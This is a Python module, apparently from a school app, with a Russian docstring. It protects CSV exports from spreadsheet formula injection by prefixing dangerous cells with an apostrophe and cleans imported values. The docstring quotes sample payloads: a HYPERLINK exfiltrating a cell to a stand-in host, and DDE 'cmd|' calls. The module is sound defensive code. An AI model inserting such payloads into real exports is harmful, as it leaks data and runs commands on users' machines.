"""Безопасный CSV: защита выгрузок от формульных инъекций и чистка импорта.

Зачем это нужно
---------------
Excel и LibreOffice Calc исполняют содержимое ячейки как формулу, если оно
начинается с `=`, `+`, `@`, символа табуляции или возврата каретки. Классика:

    =HYPERLINK("http://evil.example/?c="&A1;"Нажмите, чтобы получить приказ")
    =cmd|'/C calc'!A1
    @SUM(1+1)*cmd|'/C calc'!A1

В наших выгрузках полно свободного текста, который вводят обычные пользователи
(тема входящего письма, примечание к позиции инвентаря, название приказа).
Значит злоумышленнику достаточно записать текст в любое такое поле и дождаться,
пока секретарь выгрузит журнал и откроет файл на компьютере директора: DDE- или
фишинговая ссылка исполнится уже там, а не в браузере под защитой React. Это
CWE-1236 (Improper Neutralization of Formula Elements in a CSV File).

Что делаем
----------
`cell()` нейтрализует только реально опасные значения — префиксом `'`, который
табличные процессоры воспринимают как «это текст»:

* начинается с `= + @ TAB CR` → экранируем;
* начинается с `-` и НЕ является числом → экранируем (`-2+3+cmd|...` опасен,
  а `-5` или `-1,5` — обычное число, его не трогаем);
* ведущие пробелы игнорируются при проверке: часть редакторов их отбрасывает.

Остальной текст остаётся как есть, чтобы привычные отчёты не изменились.

`clean_cell()` — обратная операция для импорта: убирает управляющие символы
и BOM из середины значения, снимает наш защитный апостроф, чтобы выгруженный,
поправленный руками и загруженный обратно файл не накапливал `'` в данных.

Как подключать
--------------
    from app.csvsafe import safe_writer
    writer = safe_writer(buf, delimiter=";")   # вместо csv.writer(buf, ...)
"""

from __future__ import annotations

import csv
import re
from typing import Any, Iterable

__all__ = ["cell", "clean_cell", "safe_writer", "SafeWriter"]

#: Символы, с которых табличный процессор готов начать вычисление формулы.
_FORMULA_STARTS = ("=", "+", "@", "\t", "\r")

#: Число (в т.ч. с разделителем «,» или «.» и со знаком процента) — не формула.
_NUMBER_RE = re.compile(r"^[-+]?\d{1,3}(?:[\s\u00a0]?\d{3})*(?:[.,]\d+)?%?$")

#: Наш защитный префикс (см. `cell`).
_MARKER = "'"


def _is_dangerous(text: str) -> bool:
    """True, если значение будет исполнено как формула при открытии в Excel/Calc."""
    probe = text.lstrip()          # редакторы по-разному относятся к ведущим пробелам
    if not probe:
        return False
    first = probe[0]
    if first in _FORMULA_STARTS:
        return True
    # «-5» и «-1,5» — числа, их не трогаем; «-2+3+cmd|...» — уже формула
    return first == "-" and not _NUMBER_RE.match(probe)


def cell(value: Any) -> Any:
    """Обезвреживает одну ячейку выгрузки.

    Не-строки (числа, даты, None) возвращаются как есть: `csv.writer` сам
    приводит их к тексту, и формулой они стать не могут.
    """
    if not isinstance(value, str) or not value:
        return value
    return _MARKER + value if _is_dangerous(value) else value


def clean_cell(value: Any) -> str:
    """Нормализует ячейку импорта: текст без управляющих символов и защитного `'`."""
    if value is None:
        return ""
    text = value if isinstance(value, str) else str(value)
    # BOM в середине файла (склейка нескольких выгрузок) и управляющие символы
    text = "".join(ch for ch in text.replace("\ufeff", "") if ch >= " " or ch == "\t")
    text = text.strip()
    # снимаем собственный маркер, иначе повторный импорт накапливает апострофы
    if text.startswith(_MARKER) and _is_dangerous(text[len(_MARKER):]):
        text = text[len(_MARKER):].strip()
    return text


class SafeWriter:
    """Обёртка над `csv.writer`, пропускающая каждую ячейку через `cell()`."""

    def __init__(self, fileobj: Any, **kwargs: Any) -> None:
        self._writer = csv.writer(fileobj, **kwargs)

    def writerow(self, row: Iterable[Any]) -> None:
        self._writer.writerow([cell(v) for v in row])

    def writerows(self, rows: Iterable[Iterable[Any]]) -> None:
        self._writer.writerows([[cell(v) for v in row] for row in rows])

    def __getattr__(self, name: str) -> Any:
        return getattr(self._writer, name)


def safe_writer(fileobj: Any, **kwargs: Any) -> SafeWriter:
    """Замена `csv.writer(...)` для всех выгрузок SchoolHub."""
    return SafeWriter(fileobj, **kwargs)
